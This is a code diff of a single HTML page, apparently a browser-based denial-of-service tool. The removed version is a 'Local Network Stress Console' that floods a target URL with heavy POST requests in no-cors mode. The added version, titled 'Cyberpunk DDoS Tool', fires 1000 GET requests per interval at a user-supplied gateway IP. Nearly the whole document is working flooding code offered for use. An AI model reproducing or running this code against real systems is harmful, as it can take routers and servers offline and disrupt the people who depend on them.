@@ -3,214 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Local Network Stress Console // Project Meltdown</title>
-    <!-- Augmented-UI for the cyberpunk aesthetic -->
-    <link rel="stylesheet" href="https://unpkg.com/augmented-ui/augmented-ui.min.css">
-    <!-- Google Fonts for a tech-style font -->
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <title>Cyberpunk DDoS Tool</title>
     <style>
-        :root {
-            --cyber-cyan: #00f6ff;
-            --cyber-magenta: #ff00ff;
-            --cyber-bg: #0d0221;
-            --cyber-text: #d0d0d0;
-            --font-main: 'Share Tech Mono', monospace;
-        }
         body {
-            background-color: var(--cyber-bg);
-            color: var(--cyber-text);
-            font-family: var(--font-main);
+            background-color: #121212;
+            color: #00FF00;
+            font-family: 'Arial', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            height: 100vh;
             margin: 0;
-            /* Grid background effect */
-            background-image:
-                linear-gradient(rgba(0, 246, 255, 0.2) 1px, transparent 1px),
-                linear-gradient(to right, rgba(0, 246, 255, 0.2) 1px, var(--cyber-bg) 1px);
-            background-size: 35px 35px;
         }
         .container {
-            width: 90%;
-            max-width: 800px;
-            padding: 2rem;
-            /* Augmented-UI theming */
-            --aug-border-bg: var(--cyber-bg);
-            --aug-border-all: 2px;
-            --aug-border-color: var(--cyber-magenta);
-            --aug-corner-size: 16px;
+            background-color: #222222;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px #00FF00;
         }
-        h1 {
-            color: var(--cyber-cyan);
-            text-align: center;
-            text-transform: uppercase;
-            letter-spacing: 4px;
-            margin-bottom: 2rem;
-            text-shadow: 0 0 5px var(--cyber-cyan), 0 0 10px var(--cyber-cyan);
-        }
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-        label {
-            display: block;
-            margin-bottom: 0.5rem;
-            text-transform: uppercase;
-            font-size: 0.9rem;
-            color: var(--cyber-magenta);
-            letter-spacing: 1px;
-        }
-        input, select {
-            width: 100%;
-            background-color: rgba(0,0,0,0.5);
-            border: 1px solid var(--cyber-cyan);
-            color: var(--cyber-text);
-            padding: 0.75rem;
-            font-family: inherit;
-            font-size: 1rem;
-            box-sizing: border-box; /* Fix padding issue */
-        }
-        input:focus, select:focus {
-            outline: none;
-            box-shadow: 0 0 10px var(--cyber-cyan);
+        input, button {
+            margin: 10px 0;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
         }
         button {
-            width: 100%;
-            padding: 1rem;
-            background-color: var(--cyber-magenta);
-            border: none;
-            color: var(--cyber-bg);
-            font-family: inherit;
-            font-size: 1.2rem;
-            text-transform: uppercase;
             cursor: pointer;
-            letter-spacing: 2px;
-            --aug-border-all: 2px;
-            --aug-border-color: var(--cyber-cyan);
-            --aug-border-bg: var(--cyber-magenta);
-            --aug-corner-size: 8px;
         }
-        button:disabled {
-            background-color: #555;
-            cursor: not-allowed;
-            --aug-border-bg: #555;
+        #startBtn {
+            background-color: #00FF00;
+            color: #121212;
         }
-        .log-container {
-            margin-top: 2rem;
-            height: 200px;
-            background-color: #000;
-            border: 1px solid var(--cyber-magenta);
-            padding: 1rem;
-            overflow-y: scroll;
-            font-size: 0.8rem;
-            box-sizing: border-box;
+        #stopBtn {
+            background-color: #FF0000;
+            color: #121212;
         }
-        .log-entry { margin-bottom: 0.5rem; }
-        .log-entry .timestamp { color: var(--cyber-cyan); }
-        .log-entry .status { color: var(--cyber-magenta); }
-        .log-entry.error .status { color: #ff5555; }
+        #safeModeBtn {
+            background-color: #FFFF00;
+            color: #121212;
+        }
     </style>
 </head>
-<body data-augmented-ui="tl-clip tr-clip br-clip bl-clip both">
-
-    <div class="container" data-augmented-ui="tl-2-clip-x tr-2-clip-y br-2-clip-x bl-2-clip-y both">
-        <h1>Local Network Stress Console</h1>
-        <form id="control-form">
-            <div class="form-group">
-                <label for="target-url">Target Local URL (Router/Server)</label>
-                <input type="text" id="target-url" required placeholder="http://192.168.1.1">
-            </div>
-            <div class="form-group">
-                <label for="requests-per-second">Requests / Second (Max ~1000)</label>
-                <input type="number" id="requests-per-second" min="1" max="1000" value="200" required>
-            </div>
-            <div class="form-group">
-                <label for="duration">Duration (seconds)</label>
-                <input type="number" id="duration" min="1" max="300" value="30" required>
-            </div>
-             <div class="form-group">
-                <label for="payload-size">Payload Size (KB per request)</label>
-                <input type="number" id="payload-size" min="1" max="512" value="64" required>
-            </div>
-            <button type="submit" id="start-button" data-augmented-ui="tl-clip br-clip both">Initiate Assault</button>
-        </form>
-
-        <div class="log-container" id="log-container"></div>
+<body>
+    <div class="container">
+        <h1>Cyberpunk DDoS Tool</h1>
+        <input type="text" id="gateway" placeholder="Enter Gateway IP (e.g., 192.168.1.1)">
+        <button id="startBtn" onclick="startDDoS()">Start DDoS</button>
+        <button id="stopBtn" onclick="stopDDoS()">Stop</button>
+        <button id="safeModeBtn" onclick="toggleSafeMode()">Safe Mode</button>
     </div>
 
     <script>
-        const form = document.getElementById('control-form');
-        const logContainer = document.getElementById('log-container');
-        const startButton = document.getElementById('start-button');
+        let stopFlag = false;
+        let safeMode = false;
 
-        let isTestRunning = false;
-        let testInterval;
-
-        function addLog(status, message, isError = false) {
-            const entry = document.createElement('div');
-            entry.classList.add('log-entry');
-            if (isError) entry.classList.add('error');
-            
-            const time = new Date().toLocaleTimeString();
-            entry.innerHTML = `<span class="timestamp">[${time}]</span> <span class="status">[${status}]</span> <span class="message">${message}</span>`;
-            
-            logContainer.appendChild(entry);
-            logContainer.scrollTop = logContainer.scrollHeight;
+        function startDDoS() {
+            const gateway = document.getElementById('gateway').value;
+            if (!gateway) {
+                alert('Please enter a gateway IP address.');
+                return;
+            }
+            stopFlag = false;
+            safeMode = false;
+            ddosAttack(gateway);
         }
 
-        form.addEventListener('submit', (e) => {
-            e.preventDefault();
-            if (isTestRunning) return;
-
-            const targetUrl = document.getElementById('target-url').value;
-            const rps = parseInt(document.getElementById('requests-per-second').value);
-            const duration = parseInt(document.getElementById('duration').value);
-            const payloadSize = parseInt(document.getElementById('payload-size').value);
-
-            startStressTest(targetUrl, rps, duration, payloadSize);
-        });
-
-        async function startStressTest(targetUrl, rps, duration, payloadSize) {
-            isTestRunning = true;
-            startButton.disabled = true;
-            startButton.textContent = "TEST IN PROGRESS...";
-            logContainer.innerHTML = ''; // Clear logs
-
-            addLog('SYSTEM', 'Generating heavy payload...');
-            // Create a heavy payload string (1KB = 1024 chars)
-            const heavyPayload = 'a'.repeat(payloadSize * 1024);
-            const requestInit = {
-                method: 'POST',
-                headers: { 'Content-Type': 'text/plain' }, // Using plain text is simpler and just as heavy
-                body: heavyPayload,
-                mode: 'no-cors' // IMPORTANT: Bypasses CORS errors, but you won't get a response. Perfect for "fire-and-forget".
-            };
-
-            addLog('SYSTEM', `Payload generated. Size: ${payloadSize}KB.`);
-            addLog('SYSTEM', `Initiating test on ${targetUrl} for ${duration} seconds at ${rps} RPS.`);
-            
-            let requestsSent = 0;
-            const delay = 1000 / rps;
-
-            testInterval = setInterval(() => {
-                // Fire and forget. We don't wait for the response to maximize throughput.
-                fetch(targetUrl, requestInit).catch(err => {
-                    // Log errors but don't stop the test
-                    // This will likely catch network errors if the target goes down
-                });
-                requestsSent++;
-            }, delay);
-
-            // Set a timeout to stop the test
-            setTimeout(() => {
-                clearInterval(testInterval);
-                isTestRunning = false;
-                startButton.disabled = false;
-                startButton.textContent = "Initiate Assault";
-                addLog('SYSTEM', `Test finished. Sent approximately ${requestsSent} requests.`);
-            }, duration * 1000);
+        function stopDDoS() {
+            stopFlag = true;
         }
 
+        function toggleSafeMode() {
+            safeMode = !safeMode;
+        }
+
+        function ddosAttack(gateway) {
+            const interval = setInterval(() => {
+                if (stopFlag) {
+                    clearInterval(interval);
+                    return;
+                }
+                for (let i = 0; i < 1000; i++) { // Send 1000 requests per interval
+                    fetch(`http://${gateway}`, {
+                        method: 'GET',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        }
+                    })
+                    .then(response => {
+                        if (!response.ok && safeMode) {
+                            stopFlag = true;
+                            clearInterval(interval);
+                        }
+                    })
+                    .catch(error => {
+                        if (safeMode) {
+                            stopFlag = true;
+                            clearInterval(interval);
+                        }
+                    });
+                }
+            }, 0.00000001); // Send requests every 0.00000001 seconds
+        }
     </script>
 </body>
 </html>
